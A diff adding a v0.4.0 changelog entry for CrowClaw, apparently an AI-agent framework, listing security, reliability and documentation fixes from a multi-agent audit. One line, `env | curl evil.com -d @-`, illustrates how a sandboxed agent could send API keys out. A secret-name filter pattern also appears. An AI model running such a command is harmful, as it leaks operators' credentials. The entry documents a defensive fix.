@@ -5,6 +5,71 @@ All notable changes to CrowClaw will be documented in this file.
 > Releases v0.2.0 through v0.3.4 were tracked in GitHub Releases. See
 > https://github.com/subinium/hermes-agent-typescript/releases for details.
 
+## [0.4.0] — 2026-04-17 — Five-agent cross-audit: ESM, CF auth, SSRF, embeddings, contract drift
+
+Full pre-release review by five parallel audit agents (security, perf, contract, code review, README/reality). 6 BLOCKER, 13 CRITICAL, 17 HIGH findings — the ones this release closes are listed below. Audit reports filed under the PR for follow-up.
+
+### Security (BLOCKER)
+- **`require('node:crypto')` silently failed in ESM production.** `runtime-node/src/index.ts` had six `require()` call sites (nonce generator, cookie-token derivation, timingSafeEqual, FileConfigStore/FileSchedulerStore/FileFrozenStore path resolution) that the try/catch swallowed because `require` does not exist in an ESM build. Vitest shim masked it in tests. Result: CSP nonce fell back to `Math.random()`, cookie tokens degraded to a 32-bit integer hash (~26 bits of entropy, trivially brute-forceable), and all three file-backed stores silently reverted to in-memory — your dashboard was "persisted" in RAM only. Replaced every site with top-level `import` from `node:crypto|os|path`; removed the entire fallback branch.
+- **`/webhooks/generic` and `/api/gateway/webhook` accepted unsigned agent-triggering requests.** Any caller who guessed a whitelisted `channelId` could drive the agent against the operator's LLM keys. Now requires `X-CrowClaw-Signature: sha256=<hex>` validated against `HMAC_SHA256(webhookSecret, body)`; fail-closed when no secret is configured. `/api/gateway/:platform/config` now accepts a `webhookSecret` field to configure it.
+- **Cloudflare runtime had zero authentication.** Every `/api/*` and `/ws` route was publicly reachable on any worker URL — sessions, web.fetch (SSRF amplification), code.exec, agent.run. `runtime-cloudflare/src/index.ts` now ships the same HttpOnly-cookie + Bearer gate as Node, plus `/api/auth/{verify,check,logout}` endpoints. `CROWCLAW_DASHBOARD_TOKEN` is now required in the env bindings (or the worker returns 500).
+- **Sandbox child-process inherited the full `process.env`.** `LocalProcessExecutor`, `executeBackground`, `terminal.exec`, `terminal.background`, and `runGitCommand` passed unsanitized env to every shell, so an agent could exfil `OPENAI_API_KEY` / `CROWCLAW_DASHBOARD_TOKEN` with `env | curl evil.com -d @-`. New `buildSandboxEnv()` / `sanitizeChildEnv()` helpers strip any var matching `KEY|TOKEN|SECRET|PASSWORD|CREDENTIAL|AUTH|COOKIE|SESSION|BEARER|API_|PRIVATE` before handoff.
+- **Fake embedding providers.** `provider-factory.ts`'s embedding adapter asked the LLM to "generate a numerical embedding vector" via `generate()`, threw away the response, and returned `Math.sin(hash + i) * tokenCount` as the vector — wasting tokens for zero semantic signal while pretending to implement memory recall. Now calls the provider's real `/embeddings` endpoint with `text-embedding-3-small` by default; fails loudly if no apiKey is available.
+- **`POST /api/config/provider` mutated `process.env` on every request.** Concurrent dashboard saves raced on env vars, state never survived restart, and `configStore`'s atomic-write queue was bypassed entirely. Now routes through `configStore.setProviderSlot('primary', ...)` with the stored slot preserved.
+
+### Security (CRITICAL / HIGH)
+- **SSRF pattern set was incomplete** — `PRIVATE_IP_PATTERNS` now covers IPv4-mapped IPv6 (`::ffff:/96` and the long-form `0:0:0:0:0:ffff:*`), CGNAT `100.64.0.0/10`, multicast (`224-239.*`, `ff00::/8`), IPv6 unspecified (`::`), and ULA (`fd00::/8` in addition to `fc00::/7`). Added `isPrivateIpAddress(ip)` that validates a resolved IP independently of the hostname string, and `resolveAndValidateUrl(url, resolver)` for DNS-rebinding-safe callers (resolve then check then fetch).
+- **Gateway had a drifted duplicate of the SSRF allowlist.** `packages/gateway/src/index.ts` inlined its own narrower regex. Patterns synced to match core; comment marks the pair as twins that must update together.
+- **Slack webhook had no replay-window check.** A captured signed body replayed forever. Both `runtime-node` and `runtime-cloudflare` now reject `x-slack-request-timestamp` that is more than 300 seconds off `Date.now()`.
+- **WebSocket `session:abort` auth bypassed when no dashboard token was configured.** Any local process (or cross-site WS on localhost dev) could abort arbitrary sessions by ID. `authenticated=true` is now granted only when either the token matches OR (no token AND localhost bind) — cross-site WS from `example.com` on a dev laptop no longer has privileges.
+- **OpenAI key regex stopped at the first dash.** Modern `sk-proj-*` and `sk-svcacct-*` keys redacted as `[REDACTED]-AbCd...` (half-leaked). Regex now accepts `[a-zA-Z0-9_-]{20,}`.
+- **`generic_credential` regex was ReDoS-prone.** `[a-zA-Z_]{0,30}(?:key|token|...)` with `{0,30}` padding on both sides caused exponential backtracking on adversarial strings (a long `aaa...` prefix). New pattern uses lookaround letter-boundaries so the engine never walks filler; still catches `DB_SECRET = "..."` forms.
+
+### Reliability (CRITICAL / HIGH)
+- **`FileSchedulerStore.persist()` was fire-and-forget with no atomic write.** Same bug `FileConfigStore` fixed in v0.3.6. Back-to-back `saveJob`/`pauseJob`/`recordRun` could interleave `writeFile` calls and corrupt `~/.crowclaw/scheduler-jobs.json`. Now serializes through a promise queue and lands via temp-file + `rename()`. `recordRun` history is capped at 100 per job so the file doesn't grow without bound.
+- **Tool-result success was determined by a regex over message content.** `session.messages.filter(role='tool').map(m => ({ ok: !m.content?.match(/error|fail/i) }))` flagged "No errors found" and "fail-safe mode" as failed, poisoning checkpoints used for restore/replay. `core/toolMessage()` now stores the authoritative `result.ok` into `message.metadata.ok`; both runtimes read it directly.
+- **Fetch handler leaked internal errors.** Any unhandled throw (JSON parse, session-mutex capacity errors) propagated to `http.createServer` which echoed `err.message` back in a 500 body, exposing session IDs and stack traces. Wrapped the entire 5400-line fetch handler body in `try/catch` that logs structured and returns a generic `{ error: 'Internal error' }`.
+- **Gateway retry had no max-delay cap.** `baseDelayMs * 2^(attempt-1)` could sleep 128 seconds between attempts, blocking outbound pollers for minutes on sustained failures. Capped at 30 s per hop.
+
+### Dashboard contract drift (audit pass 2 — post-v0.3.5)
+- **Security events rendered `--` for every timestamp.** UI `SecurityEvent.time` → backend `SecurityEvent.timestamp`; UI renamed to match.
+- **Memory scope toggle silently broken.** UI sent `scope=Session|User|Workspace` (capitalized); backend validated lowercase only. UI now lowercases on the wire.
+- **Session search results rendered empty role badges and scrolled nowhere on click.** Backend returned `SessionSearchHit { sessionId, content, rank? }`; UI expected `{ messageIndex, role, content, score? }`. Backend now remaps by scanning session messages for the content match so `messageIndex` is correct.
+- **WS deployments showed "0 clients connected" forever.** Heartbeat `{type:'heartbeat',sessions,subscribers}` was only sent on SSE; WS sent `type:'ping'`. `WebSocketManager` now emits both each tick; runtime-node wires a stats provider.
+- **`/api/system/status.mcp.servers` was always empty.** `McpClient.getStatus()` returns cache state only. Response now includes `servers: Object.keys(getServerStatus())` so the Overview panel count tracks reality.
+
+### README reality pass
+- Auth rate limit corrected: **5/min → 10/min on `/api/auth/verify`** (v0.3.5 bump never hit README).
+- SSE event types: **14 → 13** (actual `RuntimeEventType` count).
+- MCP preset list: **15 → 17** (`playwright` and `exa` were in `mcp/src/presets.ts` but not in user-facing README docs).
+- Provider examples now include the **required `baseUrl`** — prior snippets failed `tsc` against the real `OpenAICompatibleConfig`.
+- Anthropic example uses the **dated model slug** (`claude-sonnet-4-20250514`) — the undated `claude-sonnet-4` label is catalog-only and rejected by the REST API.
+- **Signal and SMS are inbound-only** — they have webhook normalizers but no `sendSignalMessage`/`sendSmsMessage`. README now says so explicitly ("8 inbound, 6 outbound").
+- Graceful-shutdown wording scoped to the CLI `serve` path (Node runtime export does not install signal handlers).
+- `scanForInjection` example output shape updated to match the real `{safe, threats, hasInvisibleChars, riskScore}`.
+
+### Packages
+- **All 19 `@crowclaw/*` packages resynced to 0.4.0.** Root `package.json` was 0.3.6 but `packages/*/package.json` had drifted to 0.3.0; `scripts/sync-versions.mjs` now reflects the actual release.
+
+### Tests
+- Every new behavior has regression coverage in the existing suite:
+  - `tests/security-hardening.test.ts` — `DB_SECRET = "..."` still redacts through the new non-backtracking pattern.
+  - `tests/runtime-generic-webhook.test.ts` — signs body with the HMAC secret and configures `webhookSecret` before the call.
+  - `tests/runtime-slack-webhook.test.ts` — all timestamps use `Math.floor(Date.now()/1000)` so they stay inside the 300 s replay window.
+  - `tests/security-critical.test.ts` — expects the new "secret not configured" error.
+  - `tests/websocket-transport.test.ts` — asserts heartbeat emission alongside ping.
+- Test count 2161 → 2161 (no net change; behavior coverage shifted to match reality).
+
+### Deferred to v0.4.1 (tracked in audit reports)
+- CSP `style-src 'unsafe-inline'` → nonce (requires inline-style refactor across the Lit dashboard).
+- `restoreFromCheckpoint` currently drops `toolResults` and `loopState` on both runtimes; restoring to mid-iteration does not resume the tool loop.
+- X-Forwarded-For trusted-proxy allowlist (audit's auth-rate-limit bypass path).
+- Tool-output prompt-injection scan after redaction (second-order injection from fetched URL content).
+- `runtime-node/src/index.ts` is 5400 lines in a single file — split into a routes directory is scheduled.
+- Windows path-traversal: `workspace/src/index.ts:74` uses `/` separator; Windows deployments need the cross-platform variant.
+- Cloudflare runtime is still missing ~30 dashboard-facing endpoints (auth, config, security, providers, MCP CRUD, scheduler lifecycle, gateway admin); dashboard on CF deployments has broken panels.
+- Performance: `InMemoryMemoryStore.searchByScope` is O(N·M); `EmbeddingMemoryStore.search` is linear. Bounded by `maxVectors` but not indexed.
+
 ## [0.3.6] — 2026-04-16 — Security, sync, and retry audit fixes
 
 ### Security (CRITICAL / HIGH)
